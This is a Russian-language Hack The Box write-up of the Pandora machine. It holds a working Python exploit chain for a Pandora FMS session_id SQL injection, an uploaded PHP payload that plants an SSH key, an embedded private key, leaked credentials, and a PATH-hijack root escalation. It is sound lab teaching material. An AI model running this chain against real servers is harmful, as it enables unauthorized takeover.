# Pandora [HTB Writeup]

## 1. Перечисление открытых портов

Начнем сканирование с помощью утилиты Nmap:

~~~
root@localhost:~# nmap pandora.htb -o pandora.nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-16 20:38 EET
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.81 seconds
~~~

А также просканируем UDP порты

~~~
161/udp  open   snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 2.10 Mb sent, 2.06 Mb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.10.11.136  Netmask: 255.255.254.0
|     MAC address: 00:50:56:b9:87:84 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|_    Traffic stats: 135.60 Mb sent, 44.63 Mb received
| snmp-processes:
...
|   834: 
|     Name: sh
|     Path: /bin/sh
|     Params: -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
...
|   1370: 
|     Name: sshd
|     Path: sshd: daniel@pts/0
...
~~~

Находим учетные данные пользователя и входим в систему

# Пользователь №1 (daniel)

~~~
root@localhost:~# ssh daniel@pandora.htb

daniel@pandora:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
daniel@pandora:~$ sudo -l
[sudo] password for daniel: 
Sorry, user daniel may not run sudo on pandora.
daniel@pandora:~$ cat /etc/passwd
...
root:x:0:0:root:/root:/bin/bash
matt:x:1000:1000:matt:/home/matt:/bin/bash
...
~~~

Находим ещё один сайт (Pandora FMS Website), который расположен локально.

~~~
daniel@pandora:~$ netstat -tunlp
...
tcp6 :::80 LISTEN
...
~~~

Перенаправляем порт на наш локальный хост:

~~~
root@localhost:~# ssh daniel@pandora.htb -L <your_port>:127.0.0.1:80
~~~
# Пользователь №2 (matt)

## 2. SQL инъекция через параметр session_id

В поисках нужной информации о данном фреймворке, я наткнулся на данную стаю.
https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained

Из нее мы узнаем, что в данной версии фреймворка не фильтруется параметр session_id в файле chart_generation.php. Мы можем воспользоваться этим и выполнить произвольный SQL код. То-есть выполнить SQL инъекцию(SQLi).
Так как в открытом доступе не нашлось готовых эксплойтов по данному CVE, я решил написать свой.

Здесь мы будем менять куки обычного(непривилегированного) пользователя, сохраненные в таблице БД, на куки админа. Затем загрузим нашу полезную нагрузку в картинке, используя куки администратора. И войдем в систему с нашим ssh ключом, как пользователь matt.

~~~ py
#!/usr/bin/env python3

import requests as req
import paramiko
import os
import time

# SQLi to Pandora
#http://127.0.0.1:<your_port>/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- SgGO
r=req.get('http://localhost:1337/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO')
admin_cookie=r.cookies.get('PHPSESSID')

cookies = {
    'PHPSESSID': admin_cookie,
}

headers = {
    'Host': 'localhost:1337',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'multipart/form-data; boundary=---------------------------308045185511758964171231871874',
    'Content-Length': '1289',
    'Connection': 'close',
    'Referer': 'http://localhost/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
}

params = (
    ('sec', 'gsetup'),
    ('sec2', 'godmode/setup/file_manager'),
)

ssh_key_pub = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDW+tHX40B7iUqho6xolQwZ8TYjNDx6ob6+b4OUWdHcZrPv9b9f9ppc7zZkVLW94YbeJv1IKTkQIK6XxGQgMxsTXFRNH3nf53EFYhT4s367NQgxf/OB3t7BNnHVzyp0WsrZccw5eHUN6RKqs4OAoOHV+ehRQytflcoi+8zpmVNbloQnOtqccfWnL/BIX6ZD+jEWF7oTR4O3ZNa/kL8wH13F6eWouTv/quhilYOUWxoihdgNP0ctjgvc7LxtdYzRAG+LWJXLYfrIRLA1Whcg1sAEOkWDTApmN7eRjsLw/05w1iGZwH0luYkwkgWQOhcVVcjbqSfuYwCgPdY5yWvaLnBA0xJJQizozZIbjaCB2OQqHRmbG51prNaL3Jxj9wixwSFftp1xhJxfbt77ASg0teS7Cd+m6tSWpUA/p/0L6XtDHfP0sJJhUM7bIzY3PhlbXCB5cnE1KTyQBTH0I5qUze/p52ZDzPiDQ0xQMz53I1u6i4joCMChGhKofOfcjIoPO+8= root@pt-linux"
ssh_key = """-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
"""

data = f'-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="file"; filename="payload.php"\r\nContent-Type: application/x-php\r\n\r\n<?php system(\'mkdir /home/matt/.ssh; echo {ssh_key_pub} > /home/matt/.ssh/authorized_keys\');?>\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="umask"\r\n\r\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="decompress_sent"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="go"\r\n\r\nGo\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="real_directory"\r\n\r\n/var/www/pandora/pandora_console/images\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="directory"\r\n\r\nimages\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash"\r\n\r\n6427eed956c3b836eb0644629a183a9b\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash2"\r\n\r\n594175347dddf7a54cc03f6c6d0f04b4\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="upload_file_or_zip"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874--\r\n'

r=req.post('http://localhost:1337/pandora_console/index.php', headers=headers, params=params, cookies=cookies, data=data, verify=False)
if r.ok:
  print("[+] PWDED!")

# Write pub key to .ssh/authorized_keys on server
req.post("http://localhost:1337/pandora_console/images/payload.php")
w=open("key", "w")
w.write(ssh_key)
w.close()
os.system("chmod 600 ./key")
os.system("ssh -i ./key matt@pandora.htb")
~~~

И получаем ssh оболочку от пользователя matt.
Забираем флаг пользователя! :)

~~~
matt@pandora:~$ cat user.txt
e1743a7d0f330db2b7e1fe74d3d5fbb7
~~~

# Пользователь root

## 3. Локальное перечисление SUID файлов

Запустим сканирование двоичных SUID файлов.

~~~
matt@pandora:~$ ls -la `find /usr/bin -user root -perm -4000 -o -perm -2000`
-rwsr-sr-x 1 daemon daemon   55560 Nov 12  2018 /usr/bin/at
-rwxr-sr-x 1 root   tty      14488 Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root   shadow   84512 Jul 14  2021 /usr/bin/chage
-rwsr-xr-x 1 root   root     85064 Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x 1 root   root     53040 Jul 14  2021 /usr/bin/chsh
-rwxr-sr-x 1 root   crontab  43720 Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root   shadow   31312 Jul 14  2021 /usr/bin/expiry
-rwsr-xr-x 1 root   root     39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root   root     88464 Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root     55528 Jul 21  2020 /usr/bin/mount
-rwsr-xr-x 1 root   root     44784 Jul 14  2021 /usr/bin/newgrp
-rwsr-x--- 1 root   matt     16816 Dec  3 15:58 /usr/bin/pandora_backup
-rwsr-xr-x 1 root   root     68208 Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root   root     31032 May 26  2021 /usr/bin/pkexec
-rwxr-sr-x 1 root   ssh     350504 Jul 23  2021 /usr/bin/ssh-agent
-rwsr-xr-x 1 root   root     67816 Jul 21  2020 /usr/bin/su
-rwsr-xr-x 1 root   root    166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root   root     39144 Jul 21  2020 /usr/bin/umount
-rwxr-sr-x 1 root   tty      35048 Jul 21  2020 /usr/bin/wall
~~~

Находим интересный файл /usr/bin/pandora_backup

~~~
matt@pandora:~$ ls -la /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
matt@pandora:~$ cat /usr/bin/pandora_backup | less
...
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
...
~~~

Видим, что программа не использует абсолютный путь к программе tar. И поэтому мы можем записать свою полезную нагрузку в файл /tmp/tar и просто изменить параметр $PATH. Давайте попробуем!

## 4. Эксплуатация

~~~
matt@pandora:~$ echo "/bin/bash" > /tmp/tar; chmod +x /tmp/tar
matt@pandora:~$ export PATH=/tmp:$PATH
matt@pandora:~$ pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~# sudo -i
uid=0(root) gid=0(root) groups=0(root)
root@pandora:~# cat root.txt
99a9efa6a9147a60a372f074c4b956ac
~~~

И получаем корневой флаг!
HappyHack :P
